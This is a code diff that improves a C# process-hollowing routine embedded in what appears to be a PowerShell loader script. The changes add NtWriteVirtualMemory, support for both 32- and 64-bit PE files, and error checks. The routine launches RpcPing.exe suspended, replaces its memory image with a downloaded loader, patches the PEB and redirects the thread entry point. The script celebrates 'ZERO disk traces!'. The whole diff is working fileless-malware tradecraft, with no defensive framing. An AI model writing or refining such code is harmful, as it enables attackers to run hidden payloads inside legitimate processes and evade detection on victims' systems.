@@ -131,6 +131,15 @@ public class ProcessHollowing {
     );
 
     [DllImport("ntdll.dll")]
+    public static extern int NtWriteVirtualMemory(
+        IntPtr ProcessHandle,
+        IntPtr BaseAddress,
+        byte[] Buffer,
+        int BufferSize,
+        out int NumberOfBytesWritten
+    );
+
+    [DllImport("ntdll.dll")]
     public static extern int NtReadVirtualMemory(
         IntPtr ProcessHandle,
         IntPtr BaseAddress,
@@ -165,11 +174,25 @@ public class ProcessHollowing {
             // Check PE signature
             if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x00004550) return false; // PE\0\0
             
-            // Get ImageBase and SizeOfImage
+            // Get ImageBase and SizeOfImage (check if PE32 or PE32+)
             int optionalHeaderOffset = e_lfanew + 24;
-            ulong imageBase = BitConverter.ToUInt64(peBytes, optionalHeaderOffset + 24);
-            uint sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
-            uint entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
+            ushort magic = BitConverter.ToUInt16(peBytes, optionalHeaderOffset);
+            
+            ulong imageBase;
+            uint sizeOfImage;
+            uint entryPoint;
+            
+            if (magic == 0x20B) { // PE32+ (64-bit)
+                imageBase = BitConverter.ToUInt64(peBytes, optionalHeaderOffset + 24);
+                sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
+                entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
+            } else if (magic == 0x10B) { // PE32 (32-bit)
+                imageBase = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 28);
+                sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
+                entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
+            } else {
+                return false; // Unknown PE format
+            }
             
             // Create suspended process
             STARTUPINFO si = new STARTUPINFO();
@@ -190,26 +213,32 @@ public class ProcessHollowing {
                     return false;
                 }
                 
-                // Read PEB to get base address
+                // Read PEB to get base address (x64: Rdx + 16, which is sizeof(SIZE_T) * 2)
                 IntPtr pebBaseAddress = new IntPtr((long)(ctx.Rdx + 16));
                 IntPtr baseAddressPtr = Marshal.AllocHGlobal(8);
                 int bytesRead = 0;
                 
-                NtReadVirtualMemory(pi.hProcess, pebBaseAddress, baseAddressPtr, 8, out bytesRead);
+                int status = NtReadVirtualMemory(pi.hProcess, pebBaseAddress, baseAddressPtr, 8, out bytesRead);
+                if (status != 0 || bytesRead != 8) {
+                    Marshal.FreeHGlobal(baseAddressPtr);
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
+                
                 IntPtr baseAddress = Marshal.ReadIntPtr(baseAddressPtr);
                 Marshal.FreeHGlobal(baseAddressPtr);
                 
-                // Unmap original image
+                // Unmap original image if base matches
                 if (baseAddress.ToInt64() == (long)imageBase) {
                     NtUnmapViewOfSection(pi.hProcess, baseAddress);
                 }
                 
-                // Allocate memory in target process
+                // Allocate memory in target process at preferred base
                 IntPtr mem = VirtualAllocEx(pi.hProcess, new IntPtr((long)imageBase), 
                     sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                 
                 if (mem == IntPtr.Zero) {
-                    // Try any address
+                    // Try any address if preferred base not available
                     mem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeOfImage, 
                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                 }
@@ -219,14 +248,26 @@ public class ProcessHollowing {
                     return false;
                 }
                 
-                // Write PE headers
+                // Write PE headers using NtWriteVirtualMemory (like the C++ code)
                 int sizeOfHeaders = BitConverter.ToInt32(peBytes, optionalHeaderOffset + 60);
-                UIntPtr bytesWritten;
-                WriteProcessMemory(pi.hProcess, mem, peBytes, (uint)sizeOfHeaders, out bytesWritten);
+                if (sizeOfHeaders > peBytes.Length) {
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
+                byte[] headerBytes = new byte[sizeOfHeaders];
+                Array.Copy(peBytes, 0, headerBytes, 0, sizeOfHeaders);
+                
+                int bytesWritten = 0;
+                status = NtWriteVirtualMemory(pi.hProcess, mem, headerBytes, sizeOfHeaders, out bytesWritten);
+                if (status != 0) {
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
                 
                 // Write sections
                 int numberOfSections = BitConverter.ToUInt16(peBytes, e_lfanew + 6);
-                int sectionTableOffset = e_lfanew + 24 + BitConverter.ToUInt16(peBytes, e_lfanew + 20);
+                int sizeOfOptionalHeader = BitConverter.ToUInt16(peBytes, e_lfanew + 20);
+                int sectionTableOffset = e_lfanew + 24 + sizeOfOptionalHeader;
                 
                 for (int i = 0; i < numberOfSections; i++) {
                     int sectionOffset = sectionTableOffset + (i * 40);
@@ -238,20 +279,29 @@ public class ProcessHollowing {
                     
                     if (sizeOfRawData > 0 && pointerToRawData < peBytes.Length) {
                         byte[] sectionData = new byte[sizeOfRawData];
-                        Array.Copy(peBytes, pointerToRawData, sectionData, 0, 
-                            Math.Min(sizeOfRawData, peBytes.Length - (int)pointerToRawData));
+                        int copySize = Math.Min((int)sizeOfRawData, peBytes.Length - (int)pointerToRawData);
+                        Array.Copy(peBytes, pointerToRawData, sectionData, 0, copySize);
                         
                         IntPtr sectionAddr = new IntPtr(mem.ToInt64() + virtualAddress);
-                        WriteProcessMemory(pi.hProcess, sectionAddr, sectionData, 
-                            sizeOfRawData, out bytesWritten);
+                        status = NtWriteVirtualMemory(pi.hProcess, sectionAddr, sectionData, 
+                            (int)sizeOfRawData, out bytesWritten);
+                        if (status != 0) {
+                            // Continue anyway, some sections might fail
+                        }
                     }
                 }
                 
-                // Update context
+                // Update context - set entry point
                 ctx.Rcx = (ulong)(mem.ToInt64() + entryPoint);
+                
+                // Update PEB ImageBase (x64: Rdx + 16)
                 IntPtr pebImageBase = new IntPtr((long)(ctx.Rdx + 16));
                 byte[] imageBaseBytes = BitConverter.GetBytes(mem.ToInt64());
-                WriteProcessMemory(pi.hProcess, pebImageBase, imageBaseBytes, 8, out bytesWritten);
+                status = NtWriteVirtualMemory(pi.hProcess, pebImageBase, imageBaseBytes, 8, out bytesWritten);
+                if (status != 0) {
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
                 
                 // Set thread context
                 if (!SetThreadContext(pi.hThread, ref ctx)) {
@@ -315,8 +365,10 @@ if ($null -ne $loaderBytes -and $loaderBytes.Length -gt 0) {
         Write-Host "Loader executed successfully - ZERO disk traces!" -ForegroundColor Green
     } else {
         Write-Host " FAILED" -ForegroundColor Red
+        Write-Host "Error: Process hollowing failed. Check if RpcPing.exe exists and you have proper permissions." -ForegroundColor Yellow
     }
 } else {
     Write-Host " FAILED" -ForegroundColor Red
     Write-Host "Failed to download loader"
 }
+
